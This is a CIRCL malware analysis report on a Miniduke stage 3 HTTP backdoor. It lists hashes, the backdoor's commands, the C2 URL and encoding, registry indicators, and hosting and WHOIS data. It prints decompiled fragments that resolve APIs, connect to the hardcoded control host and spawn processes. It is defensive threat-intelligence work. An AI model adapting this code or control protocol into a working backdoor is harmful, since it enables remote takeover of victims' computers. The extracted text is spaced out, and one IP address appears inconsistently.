<doc>
<cover>
<heading>Analysis Report (TLP:WHITE): Analysis of a stage 3 Miniduke sample</heading>
Conducted by CIRCL - Computer Incident Response Center Luxembourg
 May 30, 2013, with an update on Jul 03, 2014
</cover>

<toc>
<heading>Contents</heading>
1 Scope of work                                                                                                                                                     3

2 Analyzed samples                                                                                                                                                  3
  2.1 Limitations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .                                                                     4
  2.2 Sharing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .                                                                     4

3 Executive summary                                                                                                                                                 4

4 Analysis                                                                                                                                                          4
  4.1 Summary . . . . . . . .       .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   4
  4.2 Techniques used . . . .       .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   4
  4.3 Implemented commands          .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   4
  4.4 Control . . . . . . . . .     .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   5
  4.5 IOC . . . . . . . . . . .     .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   5
      4.5.1 Network . . . . .       .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   5
      4.5.2 Registry . . . . .      .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   6
  4.6 Persistency . . . . . . .     .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   6
  4.7 Execution process . . . .     .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   6

5 Interesting code parts                                                                                                                                             8
  5.1 Init phase of Sample B . . . . . .                . . .       . . . . . .             .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .    8
  5.2 Decrypt and setup registry keys .                 . . .       . . . . . .             .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .    8
  5.3 evaluate commands (extract) and                   error       handling                .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .    9
  5.4 Internet connect . . . . . . . . .                . . .       . . . . . .             .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .    9
  5.5 Create process calls . . . . . . . .              . . .       . . . . . .             .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   10

6 Related indicators information                                                                                                                                    10
  6.1 Network infrastructure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .                                                                      10
</toc>

<section>
<heading>1     Scope of work</heading>
In the scope of targeted attacks with a malware labeled as Miniduke by Kaspersky Labs, CIRCL was interested in the way the malware’s later stages work and what kind of interesting information they reveal (e.g. techniques, style, IOCs) . No public analysis was found except the mention in Kaspersky’s report of a custom backdoor, so CIRCL took one of the known samples and started this analysis.
</section>

<section>
<heading>2     Analyzed samples</heading>
<list>
    • Sample A - Stage 3 sample from Kaspersky reports

          – Description
                                                        <fn>1</fn>
               * Hash found in Kaspersky Lab report
          – Original ﬁlename
               * v1.ex_
          – Hashes
               * MD5: 1e1b0d16a16cf5c7f3a7c053ce78f515
               * SHA1: de8e9def2553f4d211cc0b34a3972d9814f156aa
               * SHA-256: a1015f0b99106ae2852d740f366e15c1d5c711f57680a2f04be0283e8310f69e
          – Filesize
               * 333824 Bytes (326KB)
          – Compile time
               * Mon Jun 18 16:28:11 2012

    • Sample B - Derrived from Sample A

          – Description
               * Dumped memory region 0x0D060169 to 0x0d08b000 after de-obfuscation and
                 UCL decompression <fn>2</fn>
          – Original ﬁlename
               * Extracted from memory, no ﬁlename
          – Hashes
               * MD5: 1a2edd2db71fd41e963011da8caf26cc
               * SHA1: f344becb220de6ﬀa4d7223bdb82146d3b1c93ed
               * SHA-256: b61d409b6c1066e0c1fc4fe15f6f367be31fa2cc555cfc0ef7eeb8e5759380c0
          – Filesize
               * 175767 Bytes (172KB)
          – Compile time
               * Mon Mar 5 14:17:08 2012
</list>
<footnote>
    1 http://www.securelist.com/en/downloads/vlpdfs/themysteryofthepdf0-dayassemblermicrobackdoor.pdf
    2 http://www.oberhumer.com/opensource/ucl/
</footnote>


<heading>2.1   Limitations</heading>
This work has been done with utmost care, following best practices in software reversing, forensic investigations and/or information gathering. However, the work is only covering small aspects (based on the indicators given, lacking full context) and not an exhaustive analysis, and hence the report is as-is, not giving any guarantees of completeness or claiming absolute accuracy.

<heading>2.2   Sharing</heading>
The document is classiﬁed as TLP:WHITE, therefore CIRCL encourages everyone to share this analysis report as-is without modiﬁcation.
</section>

<section>
<heading>3     Executive summary</heading>
Sample B, contained in Sample A, can be categorized as an exhaustive backdoor, implementing any kind of functionality that can be expected for this kind of attacks. Despite the fact that it doesn’t implement any particular fancy or new technique, the code quality appears to be clean and robust, making rich use of C structures and logging and it shows on some places that it is targeting organizational infrastructures rather than home users.
</section>

<section>
<heading>4     Analysis</heading>
<heading>4.1   Summary</heading>
Sample A can be categorized as a container, obfuscating and compressing the real payload. Sample A has been debugged until Sample B’s decompression ﬁnished. The memory segment was dumped to disk for further analysis. The focus of the analysis then shifted to Sample B. Sample B is identiﬁed to be a HTTP controlled backdoor, enabling the attacker to take full control over the victim computer.

<heading>4.2   Techniques used</heading>
The analysis has been done using a mixed-approach of dynamic analysis and static analysis in order to overcome some of the obfuscation and encryptions used by the malware. Some of the techniques might have also an impact on the interpretation of the malware. Unfortunately, when we started this investigation, the domain is now pointing to an IP address of Google and returning a 404 Not Found page only. An interaction following the protocol of this malware is therefore no longer possible.

<heading>4.3   Implemented commands</heading>
The analysis of Sample B revealed the commands as shown in table 1

<heading>Table 1: Implemented commands</heading>
<table>                                     
        mv         move a ﬁle
        cp         copy a ﬁle
        rm         delete a ﬁle
       pwd         get current directory
        cd         change current directory
      rmdir        delete directory
      mkdir        create directory
    pskill/kill    kill a process
      exew         execute command
       conf        show backdoor conﬁguration
        cdt        change to temp directory
        dev        get a list of device drives
       time        get uptime of machine
       info        get path to the backdoor, computer name, username, process information
       exit        exit
      dir/ls       get the content of a directory
       exec        execute command interactively
       exeu        execute command interactively as speciﬁed domain user
        put        upload a ﬁle
        get        download a ﬁle
    pslist/ps      get a list of running processes
</table>

<heading>4.4     Control</heading>

The attacker controls the remote computer via HTTP GET and POST requests like the following: <code>* http : //news . grouptumbler . com/news/ f e e d . php? i=Me3tMZEHAuvkc~uJsO~W7lX1vSsgkuW99vD3FRgi</code>

The request is encoded in a custom BASE64 encoding, using the following alphabet: <code>* ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$~</code>



<heading>4.5     IOC</heading>
<heading>4.5.1    Network</heading>
The malware connects via HTTP GET and POST requests to <code>* http : //news . grouptumbler . com</code> and the path is ﬁxed: <code>* /news/ f e e d . php? i=</code>

The variable part is the custom BASE64 encoded string corresponding to ”i=”. A full request looks like: <code>* http : //news . grouptumbler . com/news/ f e e d . php? i={Custom BASE64}</code>

The user agent is always <code>* Mozilla /4.0</code>

Sent accept headers are: <code>* Accept :         */*</code>

<heading>4.5.2    Registry</heading>

The malware creates in <code>* HKCU\ Software \ M i c r o s o f t \ ApplicationManager</code>

a value ’AppID’ with the data it calculates from GetTickcount(), used as an identiﬁer/mutex.

<heading>4.6     Persistency</heading>
No persistency mechanisms have been identiﬁed. We assume the ﬁle is only dropped and/or executed on request via stage 2 of Miniduke and not running persistently.

<heading>4.7     Execution process</heading>
<figure>

                                                       . A
                                                    Sample




                                              UCL decompression




                                                    Sample B




                                              Sample B execution
</figure>

Update on Jul 03 2014: F-Secure released an analysis<fn>3</fn> of the latest MiniDuke evolution, called ”CosmicDuke”, mentioning similar loaders in old and new samples. That’s why we updated this document to include a graph of the loader:

<footnote>
3 http://www.f-secure.com/static/doc/labs_global/Whitepapers/cosmicduke_whitepaper.pdf
</footnote>

<figure></figure>
</section>

<section>
<heading>5     Interesting code parts</heading>
<heading>5.1     Init phase of Sample B</heading>

Decryption of module and function names

<code>   
 1 int decode_functions_and_start_internet_loop ( )
 2 {
 3   wininet . d l l = decrypt_string(&enc_wininet_dll ) ;
 4   hModule = LoadLibraryA ( wininet . d l l ) ;
 5   i f ( hModule )
 6   {
 7      lpProcName = decrypt_string(&enc_InternetOpenA ) ;
 8      InternetOpenA = GetProcAddress ( hModule , lpProcName ) ;
 9      lpProcName = decrypt_string ( enc_InternetConnectA ) ;
10      InternetConnectA = GetProcAddress ( hModule , lpProcName ) ;
11      lpProcName = decrypt_string(&enc_InternetSetOptionA ) ;
12      InternetSetOptionA = GetProcAddress ( hModule , lpProcName ) ;
13      lpProcName = decrypt_string(&enc_HttpOpenRequestA ) ;
14      HttpOpenRequestA = GetProcAddress ( hModule , lpProcName ) ;
15      lpProcName = decrypt_string(&enc_HttpSendRequestA ) ;
16      HttpSendRequestA = GetProcAddress ( hModule , lpProcName ) ;
17      lpProcName = decrypt_string(&enc_HttpQueryInfoA ) ;
18      HttpQueryInfoA = GetProcAddress ( hModule , lpProcName ) ;
19      lpProcName = decrypt_string(&enc_InternetReadFile ) ;
20      I n t e r n e t R e a d F i l e = GetProcAddress ( hModule , lpProcName ) ;
21      lpProcName = decrypt_string(&enc_InternetCloseHandle ) ;
22      InternetCloseHandle = GetProcAddress ( hModule , lpProcName ) ;
23      port = parse_int ( ”80” ) ;
24      delay = parse_int ( ”61” ) ;
25      generate_identifier_and_setup_jumptable(& i n s t a n c e ) ;
26      interne t_l oop(&i n s t a n c e ) ;
27      ExitThread ( 0 ) ;
28   }
29   return 0 ;
30 }
</code>


<heading>5.2     Decrypt and setup registry keys</heading>

<code>   
 1 decrypt_registry_keys_and_set_id ( )
 2 {
 3   result = 0;
 4   str_Software_Microsoft_ApplicationManager = decrypt_string(&
           enc_Software_Microsoft_ApplicationManager ) ;
 5   i f ( RegCreateKeyA (HKEY_CURRENT_USER, str_Software_Microsoft_ApplicationManager , &
           hKey) )
 6   {
 7      result = 0;
 8   }
 9   else
10   {
11      dwType = 4 ;
12      cbData = 4 ;
13      str_AppID = decrypt_string(&enc_AppID) ;
14      i f ( ( RegQueryValueExA (hKey , str_AppID , 0 , &dwType , &r e s u l t , &cbData ) | | dwType !=
             4)
15         && (dwType = 4 ,
16              r e s u l t = get_tickcount_based_value ( ) ,
17              RegSetValueExA (hKey , str_AppID , 0 , dwType , &r e s u l t , 4u) ) )
18       RegCloseKey (hKey) ;
19     else
20       RegCloseKey (hKey) ;
21   }
22   return r e s u l t ;
23 }
</code>


<heading>5.3   evaluate commands (extract) and error handling</heading>
<code>
 1      i f ( ! lstrcmpA(&this−>command, ”pwd” ) )
 2        {
 3          ret−>return = −127;
 4          i f ( ! GetCurrentDirectoryA (0 x400u , &ret−>message ) )
 5          {
 6             this−>command = GetLastError ( ) ;
 7             FormatMessageA (0 x1000u , 0 , this−>command, 0 , &r e t−>message , 0x400u , 0) ;
 8          }
 9          ret−>l e n += l s t r l e n A (&re t−>message ) + 1 ;
10        }
</code>


<heading>5.4   Internet connect</heading>
<code>     
 1 signed int __t hi scall internet_connect ( struct_this_7 * this )
 2 {
 3    b u f f e r = 10000;
 4    i f ( u r l [ 0 ] != ’ * ’ | | u r l [ 1 ] != ’ . ’ )
 5        lstrcpyA(&host , ”news . grouptumbler . com” ) ;
 6    else
 7        wnsprintfA(&host , 256 , ”%x%s ” , *&this−>path , 0x409001 ) ;
 8   use_proxy = 0 ;
 9    buffer = 3;
10    this−>hInternetOpen = InternetOpenA ( ” M o z i l l a / 4 . 0 ” , 0 , 0 , 0 , 0) ;
11    i f ( this−>hInternetOpen )
12   {
13        i f ( use_proxy )
14        {
15            s u c c e s s _ s e t o p t i o n = InternetSetOptionA ( this−>hInternetOpen , INTERNET_OPTION_PROXY
                       , &b u f f e r , 12) ;
16            i f ( ! success_setoption )
17            {
18                InternetCloseHandle ( this−>hInternetOpen ) ;
19                return 0 ;
20            }
21        }
22        InternetSetOptionA ( this−>hInternetOpen , INTERNET_OPTION_CONNECT_TIMEOUT, &b u f f e r ,
                  4) ;
23        InternetSetOptionA ( this−>hInternetOpen , INTERNET_OPTION_RECEIVE_TIMEOUT, &b u f f e r ,
                  4) ;
24        s u c c e s s _ s e t o p t i o n = InternetSetOptionA ( this−>hInternetOpen ,
                 INTERNET_OPTION_CONTROL_SEND_TIMEOUT, &b u f f e r , 4) ;
25       LOWORD( s u c c e s s _ s e t o p t i o n ) = port ;
26        this−>hSession = InternetConnectA ( this−>hInternetOpen , &host , s ucc ess _se top tio n , 0 ,
                    0 , INTERNET_SERVICE_HTTP, 0 , 0) ;
27        i f ( this−>hSession )
28            return 1 ;
29        InternetCloseHandle ( this−>hInternetOpen ) ;
30   }
31   return 0 ;
32 }
</code>


 <heading>5.5       Create process calls</heading>
 Command ”exec” - standard process creation:
<code>
1 hProcess = CreateProcessA (
2   0 , &this−>cmdline , 0 , 0 ,
3   1 , 0x14u , 0 , 0 ,
4  &this−>startupinfo_a , &this−>process_information )
</code>

          Command ”exeu” - process creation in a domain environment
<code>                    
1      hProcess = CreateProcessWithLogonW (
2       &Username , &Domain , lpPassword , 0 ,
3       0 , &CommandLine , 4u , 0 , &CurrentDirectory ,
4       &this−>startupinfo_b , &this−>process_information )
</code>
</section>


<section>
<heading>6       Related indicators information</heading>
<heading>6.1       Network infrastructure</heading>
The domain news.grouptumbler.com is currently resolving to 173.194.70.101

<code>     
1 f i r s t seen 2013−03−03 0 1 : 5 7 : 3 7 −0000
2 l a s t seen 2013−03−06 2 3 : 3 4 : 4 7 −0000
3 news . grouptumbler . com . A 1 7 3 . 1 9 4 . 7 0 . 1 0 1
</code>
     Before that date, the IP was 200.63.46.33
<code>     
1 f i r s t seen 2012−03−14 1 4 : 2 1 : 1 0 −0000
2 l a s t seen 2013−02−26 2 2 : 0 4 : 0 7 −0000
3 news . grouptumbler . com . A 2 0 0 . 6 3 . 4 6 . 2 3
</code>

          The IP 200.63.46.33 was hosting the following domains:
<code>          
 1   dvdform . com . A 2 0 0 . 6 3 . 4 6 . 2 3
 2   www. dvdform . com . A 2 0 0 . 6 3 . 4 6 . 2 3
 3   www. p90xprice . com . A 2 0 0 . 6 3 . 4 6 . 2 3
 4   d e x t e r s e a s o n . com . A 2 0 0 . 6 3 . 4 6 . 2 3
 5   www. d e x t e r s e a s o n . com . A 2 0 0 . 6 3 . 4 6 . 2 3
 6   news . grouptumbler . com . A 2 0 0 . 6 3 . 4 6 . 2 3
 7   www. babylearningdvd . com . A 2 0 0 . 6 3 . 4 6 . 2 3
 8   t u r b o f i r e c o u p o n . com . A 2 0 0 . 6 3 . 4 6 . 2 3
 9   www. t u r b o f i r e c o u p o n . com . A 2 0 0 . 6 3 . 4 6 . 2 3
10   s m a l l v i l l e d v d s e t . com . A 2 0 0 . 6 3 . 4 6 . 2 3
11   www. s m a l l v i l l e d v d s e t . com . A 2 0 0 . 6 3 . 4 6 . 2 3
12   miamivicedvdboxset . com . A 2 0 0 . 6 3 . 4 6 . 2 3
13   www. miamivicedvdboxset . com . A 2 0 0 . 6 3 . 4 6 . 2 3
14   www. sexandthecityondvd . com . A 2 0 0 . 6 3 . 4 6 . 2 3
15   www. sherlockholmesondvd . com . A 2 0 0 . 6 3 . 4 6 . 2 3
16   t r x f o r c e k i t o r i g i n a l . com . A 2 0 0 . 6 3 . 4 6 . 2 3
17   www. t r x f o r c e k i t o r i g i n a l . com . A 2 0 0 . 6 3 . 4 6 . 2 3
18   weddingdressestoday . com . A 2 0 0 . 6 3 . 4 6 . 2 3
19   www. maxheadroomdvdseries . com . A 2 0 0 . 6 3 . 4 6 . 2 3
</code>

None, some or all domains in this list might be malicious as well. The IP address 200.63.46.33 is currently anounced by Panamaserver.com

<code>       
1 20120426 20130311 52284 2 0 0 . 6 3 . 4 6 . 0 / 2 4 −
2 http : // bgpranking . c i r c l . l u / a s n _ d e t a i l s ?asn=52284&source=&date=
</code>

<figure></figure>

         <caption>The hosting company is not a known bulletproof hoster based on the BGP Ranking informa-
     tion<fn>4</fn> .</caption>
         and was announced by two other ISPs before:
<code>         
1 20110118 20120425 23520 2 0 0 . 6 3 . 4 6 . 0 / 2 4 − Columbus network
2 20090601 20110117 27716 2 0 0 . 6 3 . 4 6 . 0 / 2 4 − Advanced Communication Network , S .A.
</code>

WHOIS Panamaserver.com

<code>     
 1   inetnum : 200.6 3. 40/21
 2   status : allocated
 3   aut−num: N/A
 4   owner : Panamaserver . com
 5   ownerid : PA−PANA2−LACNIC
 6   r e s p o n s i b l e : Ch Group Corp .
 7   address : B e l l a Vista , El cangrejo , C a l l e 49 , 0 ,
 8   address : 00000 − Panama −
 9   country : PA
10   phone : +507 263 3723 [ ]
11   owner−c : MAC30
12   tech−c : MAC30
13   abuse−c : MAC30
14   i n e t r e v : 2 00. 63.4 6/24
15   n s e r v e r : NS1 .PANAMASERVER.COM
16   n s s t a t : 20130311 AA
17   n s l a s t a a : 20130311
18   c r e a t e d : 20080328
19   changed : 20080328
20
21   nic−hdl : MAC30
22   person : Manuel I . Cabrera Ch.
23   e−mail : ABUSE@PANAMASERVER.COM
24   address : B e l l a Vista C a l l e 39A y Ave Cuba , 0 ,
25   address : 0000 − Panama − PA
26   country : PA
27   phone : +507 8322443 [ ]
28   c r e a t e d : 20071004
29   changed : 20120311
</code>

<footnote>
       4 http://bgpranking.circl.lu/asn_details?date=2012-12-08;asn=52284
</footnote>

</section>

</doc>
